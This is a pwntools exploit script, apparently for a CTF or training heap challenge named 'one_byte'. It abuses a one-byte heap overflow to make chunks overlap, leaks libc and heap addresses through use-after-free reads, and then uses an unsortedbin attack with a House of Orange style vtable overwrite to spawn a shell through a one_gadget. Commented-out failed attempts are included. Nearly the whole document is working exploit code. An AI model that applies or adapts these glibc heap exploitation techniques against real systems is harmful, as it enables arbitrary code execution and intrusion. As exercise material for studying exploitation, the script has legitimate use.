#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen("> ", "1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send("4")
    io.sendafter("index: ", f"{index}")
    r = io.recv(0x58)
    io.recvuntil("> ")
    return r

io = start()
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# leak heap and libc addresses by putting a chunk in unsortedbin and then in fastbin

chunk1 = malloc() # used to manipulate size of chunk2
chunk2 = malloc()
chunk3 = malloc()
chunk4 = malloc() # protect from wilderness

# change size to 0x60*2
# frees chunk2 "and chunk3" and puts them in unsortedbin
# splits chunk2 from chunk3 ; chunk5 = chunk2
edit(chunk1, b"A"*0x50 + p64(0x60) + b"\xc1")
free(chunk2)
chunk5 = malloc()

# use-after-free leak
libc_leak = read(chunk3)[:8]
libc.address = u64(libc_leak) - 0x399b78
log.info("libc base address: {}".format(hex(libc.address)))

# allocs chunk3, now we have 2 ptrs to chunk3 ; chunk6 = chunk3
# add chunk3 as head of fastbin, now it has a heap ptr as fd
chunk6 = malloc()
free(chunk1) 
free(chunk3)

# use-after-free leak
heap = u64(read(chunk6)[:8])
log.info("heap base address: {}".format(hex(heap)))

chunk7 = malloc()
chunk8 = malloc()

'''
now all the bins are empty and everything is set to normal
at this point, the last_remainder is chunk3
as we will see, the heap leak wasn't used in the end
'''

one_gadget = libc.address + 0x3f712

# allocating a few more chunks

chunk9 = malloc()
chunk10 = malloc()
chunk11 = malloc()

# setting the names for easy understanding

chunk1 = chunk8
chunk2 = chunk5
chunk3 = chunk7
chunk4 = chunk4
chunk5 = chunk9
chunk6 = chunk10
chunk7 = chunk11

# setting up house of orange

'''
- After careful thinking and a few attempts at other solutions, I concluded that overlaping the _chain member with a pointer to our fake filestream was impossible because I never could get a chunk sorted in the 0x60 smallbin due to it being an exact size of the request.
- I remembered from the previous house of orange video that sometimes the script would fail because the second part of the condition (the one you mentioned that we could research on our own) would be fulfilled and will attempt to call a faulty overflow().
- Therefore, instead of targetting _chain, I decided to target the vtable_pointer.
- But first of all, I needed to see if the checks are really fulfilled. (fp->mode > 0 && (fp->wide_data->_IO_write_ptr > fp->wide_data->_IO_write_base))
- Because of the main_arena aligment, the latter will always be true. The first one will be subject to ASLR.
- It overlapped with the bk of the 0xd0. Since overflow was +0x18, 0x10 being the metadata, I would need to to overwrite the bk of the head of 0xd0 smallbin.
- Since when a chunk was added to smallbin it would get its fd and bk overitten with the main_arena ptrs, I would also need to control this chunk
'''


# control a freed chunk using the same remaindering trick we used when leaking
edit(chunk1, b"A"*0x50 + p64(0x60) + b"\xc1")
free(chunk2)
chunk12 = malloc()
chunk2 = chunk12

# overwrite the freed chunk's size with 0xd1. 0xd0 smallbin overlaps the vtable_pointer of the filestream
edit(chunk2, b"A"*0x50 + p64(0x60) + b"\xd1")

# get another 0xc0 chunk in the unsorted bin. it will be added in the front
edit(chunk4, b"A"*0x50 + p64(0x60) + b"\xc1")
free(chunk5)

# perform sorting. it will put the 0xd0 and 0xc0 chunks into their respective smalbins
# binmap will remainder the 0xc0 chunk, leaving our 0xd0 chunk alone
# We will now have a controlled 0x60 chunk in the unsorted bin
chunk13 = malloc()
chunk5 = chunk13

# edit the 0xd0 smallbin to have a one_gadget which will overlap overflow()
# perform the unsortedbin attack as well
edit(chunk3, p64(0) + p64(one_gadget))
edit(chunk6, p64(0) + p64(libc.sym._IO_list_all - 0x10))

# set things in motion and quit
malloc()
io.sendline("5")

# =============================================================================

'''
IDEA 2 - FAILED
- reasons - make an unsortedbin 0x130 and then split it to control an 0xd0 chunk
	- we can make it easier by manipulating the size

edit(chunk3, p64(libc.sym.main_arena + 88) + p64(libc.sym.main_arena + 88) + b"A"*0x40 + p64(0x60) + b"\xd0")
edit(chunk6, p64(0xd0) + p64(0x61))
edit(chunk7, p64(0x60) + p64(0x61))
free(chunk4)
'''

'''
IDEA 1 - FAILED
- reasons - I can't get a chunk sorted to smallbin 0x60 because it always fits the request

flags = "/bin/sh\x00"
size = 0x61
fd = 0
bk = libc.sym._IO_list_all - 0x10

write_base = 1
write_ptr = 2
mode = 0

vtable_pointer = heap
overflow = libc.sym.system

edit(chunk1, b"A"*0x50 + p64(0x60) + b"\xc1")
free(chunk2)
chunk11 = malloc()

edit(chunk3, p64(fd) + p64(bk) + p64(write_base) + p64(write_ptr))
edit(chunk4, b"\x00"*0x50 + p32(mode) + p32(0))
edit(chunk5, p64(overflow) + p64(heap))
'''

io.interactive()
